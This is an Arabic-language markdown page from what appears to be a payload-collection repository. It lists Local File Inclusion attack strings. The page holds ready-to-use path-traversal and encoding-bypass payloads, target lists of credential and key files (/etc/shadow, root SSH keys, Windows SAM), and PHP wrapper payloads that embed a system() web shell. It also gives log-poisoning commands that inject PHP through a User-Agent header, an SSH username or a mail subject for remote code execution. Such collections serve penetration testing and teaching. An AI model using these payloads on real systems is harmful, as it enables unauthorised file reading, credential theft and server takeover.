<a id="-lfi-payloads-collection"></a>
# 📂 مجموعة حمولات تضمين الملفات المحلية (LFI)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](LFI.tr.md) • [🇬🇷 Ελληνικά](LFI.el.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

> **ملاحظة توافق:** أمثلة `%00` تاريخية؛ اعتبر PHP المسارات التي تحتوي على محرف NUL غير صالحة ابتداءً من 5.3.4. كما أن وجود غلاف تدفق في القائمة لا يعني توافره أو سماح إعدادات التطبيق باستخدامه. [إعلان PHP 5.3.4 الرسمي](https://www.php.net/releases/5_3_4.php).

---

<a id="-linux-files"></a>
## 🐧 ملفات Linux

<a id="basic-traversal"></a>
### اجتياز المسارات الأساسي
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

<a id="url-encoded"></a>
### بترميز URL
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

<a id="bypass-techniques"></a>
### تقنيات التجاوز
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

<a id="interesting-linux-files"></a>
### ملفات Linux المهمة للاختبار
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

<a id="-windows-files"></a>
## 🪟 ملفات Windows

<a id="basic-traversal-1"></a>
### اجتياز المسارات الأساسي
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

<a id="interesting-windows-files"></a>
### ملفات Windows المهمة للاختبار
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

<a id="-wrappers-php"></a>
## 🔄 أغلفة التدفقات في PHP ‏(Wrappers)

<a id="phpfilter-read-source"></a>
### php://filter (قراءة الشيفرة المصدرية)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

<a id="phpinput-rce"></a>
### php://input (تنفيذ شيفرة عن بُعد)
```
php://input
POST: <?php system('id'); ?>
```

<a id="data-wrapper"></a>
### الغلاف data://
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

<a id="expect-rce"></a>
### expect:// (تنفيذ شيفرة عن بُعد)
```
expect://id
expect://whoami
```

<a id="zip-wrapper"></a>
### الغلاف zip://
```
zip://path/to/file.zip%23shell.php
```

<a id="phar-wrapper"></a>
### الغلاف phar://
```
phar://uploads/shell.jpg/test.php
```

---

<a id="-log-poisoning-rce"></a>
## 🔥 تسميم السجلات (تنفيذ شيفرة عن بُعد)

<a id="apache-access-log"></a>
### سجل الوصول إلى Apache
```bash
# 1. حقن PHP عبر User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. تضمين ملف السجل
?page=/var/log/apache2/access.log&cmd=id
```

<a id="ssh-log"></a>
### سجل SSH
```bash
# 1. الحقن عبر SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. تضمين السجل
?page=/var/log/auth.log&cmd=id
```

<a id="mail-log"></a>
### سجل البريد
```bash
# 1. إرسال بريد يحتوي على الحمولة
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. تضمين السجل
?page=/var/log/mail.log&cmd=id
```

<a id="proc-environ"></a>
### بيئة العملية عبر proc
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="detection"></a>
### الكشف
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

<a id="filter-bypass"></a>
### تجاوز المرشحات
| المرشح | التجاوز |
|--------|--------|
| `../` محظور | `....//`, `..././` |
| `.php` مطلوب | `%00`, بايت صفري |
| قائمة سماح | أغلفة php:// |

<a id="common-parameters"></a>
### المعاملات الشائعة
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

<a id="-resources"></a>
## 📚 مصادر

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 ترسانة حمولات LFI</b><br>
  <i>للأغراض التعليمية فقط!</i>
</p>
